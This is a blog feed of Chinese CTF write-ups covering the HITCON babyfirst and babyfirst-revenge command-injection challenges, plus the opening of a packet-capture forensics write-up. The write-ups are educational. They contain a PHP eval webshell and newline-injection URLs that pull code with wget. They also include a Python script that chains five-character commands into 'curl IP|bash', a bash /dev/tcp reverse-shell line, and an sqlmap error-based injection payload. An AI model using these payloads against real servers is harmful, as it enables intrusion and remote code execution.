alt="ietTMt.png"></p><p>第二个点在于单独一个<code>*</code>的命令有何作用，这个命令会先将当前目录下所有的文件进行一个排序，然后排序后的结果会以命令的形式送去<code>bash</code>执行，如下图，但是如果有写不是命令的话就会出现<code>command not found</code>的报错，这样一来我们就可一利用<code>dir</code>加上<code>*</code>命令去执行写入文件的操作，这也是这道题目关键之处，利用了逆序执行命令的骚操作，这得对Linux系统多么熟悉啊<br><img src="https://s1.ax1x.com/2018/09/18/iet7sP.png" alt="iet7sP.png"></p><p>接着上就提出下一个知识点，就是利用<code>rev</code>命令去反向文件的字符串，顾名思义，我们就是要把<code>ls -t &gt;g</code>这一条命令给逆序过来，这操作很强。这也是为什么要先构造下图中的文件名，你逆序过来就会发现是<code>ls -th &gt;g</code></p><p><img src="https://s1.ax1x.com/2018/09/18/ietHqf.png" alt="ietHqf.png"><br>有人可能会问为什么会多加一个<code>h</code>，因为如果不多加<code>h</code>的话在你执行<code>dir</code>的时候按字母排序字母<code>t</code>比<code>s</code>更靠后，放进<code>v</code>文件之后以及放入想文件里面是这样的，这就跟我们的目的相违背，不能构造出<code>ls -t &gt;g</code>了，但是我们构造的是<code>ls  -th &gt;g</code>情况就会有所改观，这个<code>h</code>实际上没有影响，就是一个改变视图结构的东西，把内存大小变得更加人性化而已。<br><img src="https://s1.ax1x.com/2018/09/18/ietqZ8.png" alt="ietqZ8.png"></p><p><img src="https://s1.ax1x.com/2018/09/18/ietLdS.png" alt="ietLdS.png"></p><p>按照上面所说把<code>v</code>文件的内容弄好，下面就应该创建一个<code>rev</code>的文件，为的是利用这个命令，通过<code>*v&gt;x</code>的方式把逆序后的内容放在x文件里面，到后期可以直接sh执行，<code>*v&gt;x</code>这个命令的含义就是将所有最后一个字母都是<code>v</code>的文件排个序，然后执行，因为r在v的前面实际上的命令就是 <code>rev v&gt;x</code>，所以最后到<code>x</code>文件里面的内容就是<br><img src="https://s1.ax1x.com/2018/09/18/ietjiQ.png" alt="ietjiQ.png"></p><p>到这里就跟第一个babyfirst-revenge一样了，后续步骤就不多说了,直接上EXP获取flag2333</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.第一个利用的点是逆序字符串放入文件中在执行，如果让我来想我是绝对想不到的，学习了<br>2.第二个就是利用了<code>dir</code>命令完美滴绕过了<code>ls&gt;&gt;x</code>这个限制<br>3.Linux下<code>*</code>命令巧妙使用</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个题目的条件更加苛刻了，先放个源码
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2015 babyfirst复现</title>
    <link href="0verwatch.top/2018/09/14/hitcon2015-babyfirst/"/>
    <id>0verwatch.top/2018/09/14/hitcon2015-babyfirst/</id>
    <published>2018-09-14T09:10:41.000Z</published>
    <updated>2018-09-14T09:25:54.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续上面的题目，直接利用上一道题目的docker环境复现一道题目<a id="more"></a>，注意这里面的docker环境可能需要自己在某些文件夹下面设置权限，自己缺点什么环境就自己下就行了，感觉这个题目的难度比较上一题低了一点，参考博客: <a href="https://blog.spoock.com/2017/09/09/Babyfirst-writeup/" target="_blank" rel="noopener">https://blog.spoock.com/2017/09/09/Babyfirst-writeup/</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先放个题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">'sandbox/'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !file_exists($dir) )</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    chdir($dir);</span><br><span class="line"></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) )</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    exec(<span class="string">"/bin/orange "</span> . implode(<span class="string">" "</span>, $args));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一段代码的意思就是建立一个<code>sandbox/clientip</code>文件夹 ，然后利用通过get法师获取args的参数，然后里面有一个正则匹配，只能通过的是数字以及字母不然的话就会直接die掉，最后就是利用exec这个执行函数了，而/bin/orange最终发现只是/bin/true的软链接，没有任何的作用。</p><p>这个题目关键是那个正则，那个正则在很多题目也有见到过，由于preg_match()使用的是\w来进行检查，所有的斜线、破折号和点<code>(\,-,.)</code>都无法使用。另外就是在<code>/^\w+$\</code>中的<code>$</code>当遇到一个字符串的结尾是换行符时还是可以匹配的。利用这个特性，就可以绕过前面的<code>preg_match()</code>检查，同时多出的换行符还可以在<code>exec()</code>函数中执行。</p><p>个人感觉这个题目如果<code>implode</code>里面的分割用的不是空格而是其他的类似逗号的东西这一个题目不一定可以写文件，或许其他大佬有办法可以跟我讲讲。留了空格刚好就可以写文件了</p><p>比如传参的url是这样的<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=touch&amp;args[]=0ver</code><br>这三个参数都可以经过正则匹配<br>那么执行的过程就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/orange xxx</span><br><span class="line">touch test</span><br></pre></td></tr></table></figure><p>可以成功创建文件<br><img src="https://s1.ax1x.com/2018/09/14/iEgrQg.png" alt="iEgrQg.png"><br>这样一来，就先了正则，然后既可以创建文件了，如果implode里面不用空格分割的话，后面创建文件就会变成<code>touchtest</code>，这种东西是不可以创建文件的 </p><p>然后这里就是参考了大佬们的做法利用<code>wget</code>的方式去实现，tql</p><p>这里牵涉到另外一个知识点，我们平常见到的ip地址都是点分十进制表示的，其实IP地址还可以用直接10进制，八进制等等表示都可以</p><p>然后再开一个本地环境:192.168.1.106，服务器:192.168.1.102</p><p>在本地里面创建一个页面index.php内容为<code>&lt;?php phpinfo();?&gt;</code><br><a href="https://imgchr.com/i/iEgfYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgfYV.md.png" alt="iEgfYV.md.png"></a></p><p>然后再往服务器发送相应的参数，这时候的ip地址转化就起作用了，把本地ip换一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">"%u"</span>, ip2long(<span class="string">"192.168.1.106"</span>));</span><br></pre></td></tr></table></figure><p>得到输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3232235882</span><br></pre></td></tr></table></figure></p><p>这里用的这样的输出方法是为了解决32位以及64位php版本的问题，因为由于自己的php版本是32 位的输出的是负数，所以才用这样的的解决方法，参考链接<br><a href="https://blog.csdn.net/everything1209/article/details/22418559" target="_blank" rel="noopener">https://blog.csdn.net/everything1209/article/details/22418559</a></p><p>这时候就是开始利用了<br><code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=wget&amp;args[]=3232235882</code><br>然后就直接把192.168.1.106主页的页面给下载下来，但是这个页面是解析过了的，没有任何PHP语言的痕迹，只剩下html了<br><a href="https://imgchr.com/i/iEgIlF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgIlF.md.png" alt="iEgIlF.md.png"></a></p><p>这时候又是另外一个知识点了<br>在Linux中PHP能够执行非压缩的打包的PHP文件。<br>也就是这样的过程<br>创建1.php，内容为<code>&lt;?php echo &quot;123&quot;;?&gt;</code>，通过<code>tar</code>将<code>1.php</code>打包,<code>tar cvf test 1.php</code>，PHP运行test文件，可以运行<br><a href="https://imgchr.com/i/iEgHm9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgHm9.md.png" alt="iEgHm9.md.png"></a></p><p>复现到这里，发现orange大佬真是强，到后期就是利用上面两个知识点</p><p>在原来的本地的index.html里面改成这样的代码，注意一定要在<code>index.html</code>里面写上这样的语句，不然的话就会在像上面的例子一样在<code>index.php</code>里面的语句会被解析之后下载，会毫无用处下载下来是没有php语句的，更别谈解析了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'cmd.php'</span>, <span class="string">'</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">header("Content-Type: text/plain");</span></span><br><span class="line"><span class="string"> @eval($_POST["cmd"]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'</span>);</span><br></pre></td></tr></table></figure><p>然后开始写webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=mkdir&amp;args[]=exploit 创建exploit文件夹</span><br><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=cd&amp;args[]=exploit%0a&amp;args[]=wget&amp;args[]=3232275969   进入exploit文件夹，下载192.168.158.1的index.html文件。</span><br></pre></td></tr></table></figure><p>然后就是利用打包的方式去执行相关的PHP代码了，想直接改名字是不可能的因为命令里面含有<code>&#39;.&#39;</code>这样的字符<br>再来一句<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=php&amp;args[]=cmd</code> 执行一波这个打包未压缩的PHP文件</p><p>然后可以执行一句话木马了，打开小马页面<code>http://192.168.1.102/sandbox/192.168.1.102/cmd.php</code>，上菜刀链接成功<br><a href="https://imgchr.com/i/iE2S6e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iE2S6e.md.png" alt="iE2S6e.md.png"></a></p><p>再看一下服务器下面的目录成功创建了<code>cmd.php</code>页面<br><img src="https://s1.ax1x.com/2018/09/14/iE2Kmj.png" alt="iE2Kmj.png"></p><p>再看看出题人的官方wp发现还有其他骚操作<br>就是利用一波<code>ftp</code>方式去下载远程的一句话木马，因为自己虚拟机没有<code>busybox</code>这个东西就不搞了<br>但还是得过一遍脑紫的，利用下面的命令把远处<code>ftp</code>服务器里面的<code>webshell.php</code>给下载下来，这样做的好处就是不用再管原来那些php繁琐的解析步骤，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox ftpget -u ftp的用户名 -p ftp的密码 ftp地址 需要下载的文件名</span><br></pre></td></tr></table></figure><p>很好的思路学习了，不一定就是busybox，还有其他利用ftp的下载功能来获取webshell的。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.两个运用的知识点远程wget下载的PHP文件是经过解析的，服务器是可以通过用php执行打包的文件的，注意不是压缩的PHP文件，有点像是两个本来安全的东西放在一起后就变成了不安全的东西。。。。个人感觉问题的严重性还是出现在php能够执行未压缩的打包文件上。<br>2根据上一次的复现题目，个人感觉命令执行在这两道题目的上面都利用了远程的另外一台主机，第一次是使用了curl命令去访问，而这次是通过wget或者是ftp去访问，骚操作又学习了一波<br>3.正则可以换行符继续匹配那个点就不多说了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;继续上面的题目，直接利用上一道题目的docker环境复现一道题目
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2017 babyfirst-revenge复现</title>
    <link href="0verwatch.top/2018/09/06/hitcon2017-babyfirst/"/>
    <id>0verwatch.top/2018/09/06/hitcon2017-babyfirst/</id>
    <published>2018-09-06T09:30:36.000Z</published>
    <updated>2018-09-14T09:25:06.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯<a id="more"></a>emmm</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先从Hitcon2017 babyfirst-revenge这一个题目，总结一下还是学到很多东西的<br>复现地址 <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p><p>这是题目回显的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个源码的意思就是会自动创建一个<code>/www/sandbox/</code>然后在下面新建文件夹，然后可以通过<code>cmd</code>参数去执行相关系统命令，但是这个系统命令的长度是会有限制的，这题的关键在于要绕过这个长度以及如何去构造<code>getshell</code>的命令。<br>突然发现P神就是很早就有类似文章，我还是太菜，得拼命学习啊<br><a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a></p><h4 id="知识点一"><a href="#知识点一" class="headerlink" title="知识点一"></a>知识点一</h4><p>在Linux下面可以通过换行去执行断断续续的命令，例如<br><img src="https://s1.ax1x.com/2018/09/06/iCZyI1.png" alt="iCZyI1.png"></p><h4 id="知识点二"><a href="#知识点二" class="headerlink" title="知识点二"></a>知识点二</h4><p>在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过<code>sh filename</code>来执行文本里面的系统命令，如果有报错的话会自动跳过<br>如<br><a href="https://imgchr.com/i/iCZgG6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCZgG6.md.png" alt="iCZgG6.md.png"></a></p><h4 id="知识点三"><a href="#知识点三" class="headerlink" title="知识点三"></a>知识点三</h4><p>我们可以通过&gt;+fileanme来实现新建一个文件，注意区别一下<code>&gt;</code>和<code>&gt;&gt;</code>这两个符号<br>小于号：命令默认从键盘获得的输入，改成从文件，或者其它打开文件以及设备输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; 是追加内容</span><br><span class="line">&gt; 是覆盖原有内容</span><br></pre></td></tr></table></figure><p>后面会有这里的详细利用</p><p>这样就可以运用这两个知识点去实现这段代码的绕过<br>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p><p>这里面注意两个点<br>第一点<code>ls</code>命令列文件的顺序，通过php执行的ls命令以及直接在linux下执行的ls命令是不一样的，因为我们一开始的输入是从php里面开始的<br>ls 的默认排序方式手册上只写了是<code>alphabetically</code>（字典序），经过测试发现ls排序方式是忽视字母大小写，数字排在字母前面，无视数字和英文字母之外的字符。<br>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a><br><img src="https://s1.ax1x.com/2018/09/06/iCetwd.png" alt="iCetwd.png"></p><p>所以还是按照官方wp那样通过追加方式去添加内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&gt;ls\\'</span>, </span><br><span class="line"> <span class="string">'ls&gt;_'</span>, </span><br><span class="line"> <span class="string">'&gt;\ \\'</span>, </span><br><span class="line"> <span class="string">'&gt;-t\\'</span>, </span><br><span class="line"> <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line"> <span class="string">'ls&gt;&gt;_'</span>,</span><br></pre></td></tr></table></figure><p>就是为了拼凑出<code>ls -t&gt;g</code>，这是为了后面构造<code>curl 192.168.1.104|bash</code> 做好准备，我们就可以通过时间的先后顺序把curl命令完整的拼接</p><p>第二点我们是通过构造文件名，然后通过<code>ls</code>命令将文件名写入到另外一个文件里面去然后执行，这里面要注意转义符号<code>\</code>(反斜杠)不要忘记</p><p>然后我们在自己的vps上先写好反弹webshell的话<br><a href="https://imgchr.com/i/iCeaFI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeaFI.md.png" alt="iCeaFI.md.png"></a></p><p>开始监听端口<br><img src="https://s1.ax1x.com/2018/09/06/iCeBSf.png" alt="iCeBSf.png"></p><p>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash` </span></span><br><span class="line">    <span class="string">'&gt;sh\ '</span>, </span><br><span class="line">    <span class="string">'&gt;ba\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;6\\'</span>,  </span><br><span class="line">    <span class="string">'&gt;10\\'</span>,</span><br><span class="line">    <span class="string">'&gt;1.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;8.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;16\\'</span>, </span><br><span class="line">    <span class="string">'&gt;2.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;19\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://192.168.1.104:49200//?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">'http://192.168.1.104:49200//?cmd='</span> + quote(i) )</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><p>反弹webshell成功<br>然后在<code>/home</code>目录下发现有关flag的东西，应该是在数据库里面<br>连接一下<br><img src="https://s1.ax1x.com/2018/09/06/iCeDl8.png" alt="iCeDl8.png"><br>交互性极差，每次都要exit一下才有回显，也是服气。。。但最后还是得到flag了<br><a href="https://imgchr.com/i/iCer6S" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCer6S.md.png" alt="iCer6S.md.png"></a></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>其实这个题目还有其他骚操作，比如用利用<code>wget</code>，以及直接构造一个比较骚气的域名。。这域名搞不来，我就没有尝试了，至于wget方法的话下次复现一下2015年的babyfirst在尝试一下<br>小结一波，这个题目收获很大，先来讲这个东西其实是关乎对Linux系统各种缩小版米昂领的熟悉程度，比如怎样能快速新建文件这里就用了&gt;这个符号去创建，还有通过管道符去执行bash命令(这一点就可以继续去推行还可以使用python，php一系列的命令结合各种语言反弹webshell的操作)，这都是我想不到的东西，归根到底是学的东西还是不能够灵活使用<br>顺便吐槽一下，最近的算法课懵逼得很，全都跟高数的级数收敛还有泰勒展开扯上关系，突然恐惧，还得重新用C++写oj上的算法题目，都是些大佬。。我做完的时候他们都不知道ak多久了。。。<br><a href="https://imgchr.com/i/iCeb79" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeb79.md.png" alt="iCeb79.md.png"></a></p><p>恐怕9月份难熬23333.。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>铁三2018.5.5数据分析</title>
    <link href="0verwatch.top/2018/09/06/liuliangfenxi-5-5/"/>
    <id>0verwatch.top/2018/09/06/liuliangfenxi-5-5/</id>
    <published>2018-09-06T09:30:21.000Z</published>
    <updated>2018-09-06T09:53:58.882Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>keep learning</p></blockquote><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>链接: <a href="https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ</a> 密码: nux4<br>感谢方方土学长的<a href="http://skysec.top/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" target="_blank" rel="noopener">题解</a>，学习到<a id="more"></a>了一定的套路</p><p>题目描述</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.黑客攻击的第一个受害主机的网卡IP地址</span><br><span class="line">2.黑客对URL的哪一个参数实施了SQL注入</span><br><span class="line">3.第一个受害主机网站数据库的表前缀(加上下划线 例如abc_)</span><br><span class="line">4.第一个受害主机网站数据库的名字</span><br><span class="line">5.Joomla后台管理员的密码是多少</span><br><span class="line">6.黑客第一次获得的php木马的密码是什么</span><br><span class="line">7.黑客第二次上传php木马是什么时间</span><br><span class="line">8.第二次上传的木马通过HTTP协议中的哪个头传递数据</span><br><span class="line">9.内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)</span><br><span class="line">10.php代理第一次被使用时最先连接了哪个IP地址</span><br><span class="line">11.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候</span><br><span class="line">12.黑客在内网主机中添加的用户名和密码是多少</span><br><span class="line">13.黑客从内网服务器中下载下来的文件名</span><br></pre></td></tr></table></figure><p>先看看这些包都是按时间顺序命名的<br><img src="https://s1.ax1x.com/2018/09/06/iCAIZn.png" alt="iCAIZn.png"><br>先打开第一个包<br>一般黑客攻击先从应用层发起攻击，所以先过滤<code>http</code>看一下<br>发现ip为<code>202.1.1.2</code>对<code>192.168.1.8</code>有很明显的爆破痕迹，把里面的url的内容urldecode一下会发现明显的sql查询语句，而且有很明显sqlmap指纹痕迹<br><img src="https://s1.ax1x.com/2018/09/06/iCAbGT.png" alt="iCAbGT.png"></p><p>所以就解决了受害主机ip是<code>192.168.1.8</code><br>我们再详细过滤一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and ip.src == 202.1.1.2</span><br></pre></td></tr></table></figure><p>可以得到比较详细的爆破过程，标记一下最后一个，然后返回http查看他的response<br><a href="https://imgchr.com/i/iCAqRU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCAqRU.md.png" alt="iCAqRU.md.png"></a></p><p>很明显了，注入的参数是<code>list[select]</code>,并且应该是使用了<code>报错注入</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">xml:lang</span>=<span class="string">"en-gb"</span> <span class="attr">lang</span>=<span class="string">"en-gb"</span> <span class="attr">dir</span>=<span class="string">"ltr"</span>&gt;</span>\n</span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span>\n</span><br><span class="line">   \t<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"content-type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span>\n</span><br><span class="line">    [truncated]\t<span class="tag">&lt;<span class="name">title</span>&gt;</span>Error: 500 XPATH syntax error: &amp;#039;qqzvqadminqqkkq&amp;#039; SQL=SELECT (UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71</span><br><span class="line">   FROM `ajtuc_ucm_history` AS h\n</span><br><span class="line">   LEFT JOIN ajtuc_users AS uc ON uc.id = 